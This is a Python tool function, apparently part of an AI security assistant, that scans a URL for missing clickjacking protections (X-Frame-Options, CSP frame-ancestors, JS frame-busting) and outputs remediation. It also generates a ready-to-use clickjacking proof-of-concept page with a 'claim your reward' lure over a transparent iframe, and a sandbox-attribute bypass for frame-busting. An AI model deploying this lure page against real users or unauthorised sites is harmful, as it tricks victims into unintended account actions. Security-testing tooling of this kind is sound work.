import re
import requests
from src.sdk.tool import function_tool
from .common import _DEFAULT_HEADERS, _TIMEOUT, register_appsec_vulnerability


@function_tool()
async def clickjacking_scanner(
    url: str,
    cookies: str = "",
    generate_poc: bool = True,
) -> str:
    """
    Scan for Clickjacking vulnerabilities.

    Checks for missing or misconfigured frame protection headers (X-Frame-Options
    and CSP frame-ancestors). Generates a ready-to-use PoC HTML file if the
    target is frameable.

    Tests:
      1. X-Frame-Options header (DENY, SAMEORIGIN, ALLOW-FROM)
      2. Content-Security-Policy frame-ancestors directive
      3. JavaScript frame-busting detection (basic)
      4. Sandbox bypass feasibility

    Args:
        url: Target URL to test (e.g. https://target.com/account/settings)
        cookies: Session cookies for authenticated testing
        generate_poc: Generate PoC HTML for exploitation (default: True)

    Returns:
        Clickjacking assessment with PoC if vulnerable
    """
    out = [f"=== Clickjacking Scanner: {url}", ""]
    findings = []

    hdrs = {**_DEFAULT_HEADERS}
    if cookies:
        hdrs["Cookie"] = cookies

    # ── Fetch target page ─────────────────────────────────────────────────
    try:
        r = requests.get(url, headers=hdrs, timeout=_TIMEOUT, verify=False,
                         allow_redirects=True)
    except Exception as e:
        return f"Error fetching {url}: {e}"

    body = r.text or ""
    resp_headers = r.headers

    # ── Check 1: X-Frame-Options ──────────────────────────────────────────
    out.append("── Check 1: X-Frame-Options Header ────────────")
    xfo = resp_headers.get("X-Frame-Options", "").strip().upper()
    if not xfo:
        out.append("  ⚠️ X-Frame-Options: NOT SET")
        findings.append(
            "HIGH → X-Frame-Options header is MISSING — page can be framed by any origin."
        )
    elif xfo in ("DENY",):
        out.append(f"  ✅ X-Frame-Options: {xfo} — framing blocked entirely")
    elif xfo in ("SAMEORIGIN",):
        out.append(f"  ✅ X-Frame-Options: {xfo} — only same-origin framing allowed")
    elif xfo.startswith("ALLOW-FROM"):
        allowed = xfo.replace("ALLOW-FROM", "").strip()
        out.append(f"  ⚠️ X-Frame-Options: ALLOW-FROM {allowed}")
        out.append("    Note: ALLOW-FROM is deprecated and NOT supported by Chrome/Edge/Safari")
        findings.append(
            f"MEDIUM → X-Frame-Options uses deprecated ALLOW-FROM ({allowed}) — "
            "not enforced by modern browsers (Chrome, Edge, Safari). Page is frameable."
        )
    else:
        out.append(f"  ⚠️ X-Frame-Options: {xfo} (non-standard value)")
        findings.append(
            f"MEDIUM → X-Frame-Options has non-standard value '{xfo}' — may not be enforced."
        )

    # ── Check 2: CSP frame-ancestors ──────────────────────────────────────
    out.append("")
    out.append("── Check 2: CSP frame-ancestors ────────────────")
    csp = resp_headers.get("Content-Security-Policy", "")
    csp_ro = resp_headers.get("Content-Security-Policy-Report-Only", "")

    frame_ancestors = ""
    for policy in [csp, csp_ro]:
        match = re.search(r"frame-ancestors\s+([^;]+)", policy, re.IGNORECASE)
        if match:
            frame_ancestors = match.group(1).strip()
            break

    if frame_ancestors:
        if "'none'" in frame_ancestors:
            out.append("  ✅ frame-ancestors: 'none' — framing blocked entirely")
        elif "'self'" in frame_ancestors and "http" not in frame_ancestors:
            out.append(f"  ✅ frame-ancestors: {frame_ancestors} — same-origin only")
        else:
            out.append(f"  ⚠️ frame-ancestors: {frame_ancestors}")
            if "*" in frame_ancestors:
                findings.append(
                    "HIGH → CSP frame-ancestors allows wildcard (*) — page is frameable by any origin."
                )
            elif "http:" in frame_ancestors or "https:" in frame_ancestors:
                findings.append(
                    f"MEDIUM → CSP frame-ancestors allows specific origins: {frame_ancestors} — "
                    "verify if any are attacker-controllable."
                )
    else:
        out.append("  ⚠️ CSP frame-ancestors: NOT SET")
        if not xfo:
            findings.append(
                "HIGH → Neither X-Frame-Options nor CSP frame-ancestors are set — "
                "page is fully frameable by any origin. Clickjacking is possible."
            )

    # When Report-Only is used instead of enforced CSP
    if csp_ro and "frame-ancestors" in csp_ro and not (csp and "frame-ancestors" in csp):
        out.append("  ⚠️ frame-ancestors only in Report-Only CSP — NOT enforced!")
        findings.append(
            "MEDIUM → frame-ancestors is in Content-Security-Policy-Report-Only, "
            "not the enforced CSP. Framing is NOT blocked."
        )

    # ── Check 3: JavaScript frame-busting ─────────────────────────────────
    out.append("")
    out.append("── Check 3: JavaScript Frame-Busting ──────────")

    framebuster_patterns = [
        r"top\s*[\.\[]",       # top.location, top['location']
        r"self\s*!==?\s*top",  # self !== top
        r"parent\s*!==?\s*self", # parent !== self
        r"window\.frameElement",
        r"if\s*\(\s*top\b",
        r"top\.location\s*=",
    ]
    has_framebuster = False
    for pattern in framebuster_patterns:
        if re.search(pattern, body, re.IGNORECASE):
            has_framebuster = True
            out.append(f"  ℹ️ Frame-busting JS detected: /{pattern}/")

    if has_framebuster:
        out.append("  ⚠️ JavaScript frame-busting can be bypassed with sandbox attribute:")
        out.append('    <iframe sandbox="allow-forms allow-scripts" src="..."></iframe>')
        if not xfo and not frame_ancestors:
            findings.append(
                "MEDIUM → JS frame-busting detected but no X-Frame-Options/CSP headers. "
                "Frame-busting can be bypassed via iframe sandbox attribute."
            )
    else:
        out.append("  ℹ️ No JavaScript frame-busting detected in page source")

    # ── Check 4: Sensitive actions on the page ────────────────────────────
    out.append("")
    out.append("── Check 4: Sensitive Action Detection ─────────")
    sensitive_patterns = [
        (r'<form[^>]*action', "Form submission"),
        (r'<button[^>]*type=["\']submit', "Submit button"),
        (r'<input[^>]*type=["\']password', "Password field"),
        (r'delete|remove|transfer|withdraw|approve|confirm|deactivate',
         "Dangerous action keyword"),
        (r'<a[^>]*href[^>]*delete|<a[^>]*href[^>]*remove', "Delete link"),
    ]
    sensitive_found = []
    for pattern, label in sensitive_patterns:
        if re.search(pattern, body, re.IGNORECASE):
            sensitive_found.append(label)

    if sensitive_found:
        out.append(f"  ⚠️ Sensitive elements found: {', '.join(sensitive_found)}")
        if findings:
            out.append("    → These can be targeted in a clickjacking attack!")
    else:
        out.append("  ℹ️ No obvious sensitive form actions detected")

    # ── PoC Generation ────────────────────────────────────────────────────
    if generate_poc and findings:
        out.append("")
        out.append("── Clickjacking PoC ───────────────────────────")

        poc_html = f'''<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC — CyberCoPilot</title>
  <style>
    body {{ font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; 
           text-align: center; padding: 40px; }}
    h1 {{ color: #e94560; }}
    .container {{ position: relative; width: 900px; height: 600px; margin: 20px auto;
                  border: 2px solid #e94560; }}
    iframe {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%;
              opacity: 0.3; z-index: 2; border: none; }}
    .overlay {{ position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
                z-index: 1; }}
    .overlay button {{ padding: 20px 50px; font-size: 24px; background: #e94560;
                       color: #fff; border: none; border-radius: 8px; cursor: pointer; }}
    .note {{ margin-top: 20px; color: #aaa; font-size: 14px; }}
    .toggle {{ margin: 15px; padding: 8px 20px; background: #333; color: #e94560;
               border: 1px solid #e94560; cursor: pointer; border-radius: 4px; }}
  </style>
</head>
<body>
  <h1>⚡ Clickjacking PoC</h1>
  <p>Target: <code>{url}</code></p>
  <button class="toggle" onclick="toggleOpacity()">Toggle iframe visibility</button>
  <div class="container">
    <div class="overlay">
      <button>Click here to claim your reward!</button>
    </div>
    <iframe src="{url}"></iframe>
  </div>
  <p class="note">
    The transparent iframe overlays the button. When the victim clicks "Claim reward",
    they actually click on the target page underneath.<br>
    Adjust iframe opacity with the toggle button.
  </p>
  <script>
    let visible = false;
    function toggleOpacity() {{
      const iframe = document.querySelector('iframe');
      visible = !visible;
      iframe.style.opacity = visible ? '1.0' : '0.0';
    }}
  </script>
</body>
</html>'''

        out.append("  Save the following HTML as 'clickjack_poc.html' and open in a browser:")
        out.append("```html")
        out.append(poc_html)
        out.append("```")
        out.append("")
        out.append("  For sandbox bypass variant, use:")
        out.append(f'  <iframe sandbox="allow-forms allow-scripts" src="{url}"></iframe>')

    # ── Summary ───────────────────────────────────────────────────────────
    out.append("")
    if findings:
        out.append("── FINDINGS ──────────────────────────────────")
        for f in findings:
            out.append(f"🔴 {f}")
            # Parse severity from finding string (e.g., "HIGH → ...")
            severity = "HIGH"
            if "→" in f:
                sev_part = f.split("→")[0].strip()
                if sev_part in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
                    severity = sev_part

            await register_appsec_vulnerability(
                target_url=url, vuln_type="Clickjacking", severity=severity,
                parameter="Headers", payload="", evidence=f
            )
        out.append("")
        out.append("Impact:")
        out.append("  • One-click account deletion/deactivation")
        out.append("  • One-click fund transfer (if banking app)")
        out.append("  • One-click permission grant (OAuth consent)")
        out.append("  • Multi-step clickjacking for complex workflows")
        out.append("")
        out.append("Remediation:")
        out.append("  • Set X-Frame-Options: DENY (or SAMEORIGIN if iframing is needed)")
        out.append("  • Set Content-Security-Policy: frame-ancestors 'none'")
        out.append("  • Both headers should be set for maximum browser coverage")
    else:
        out.append("✅ Page is protected against clickjacking.")
        out.append("Both X-Frame-Options and/or CSP frame-ancestors are properly configured.")

    return "\n".join(out)
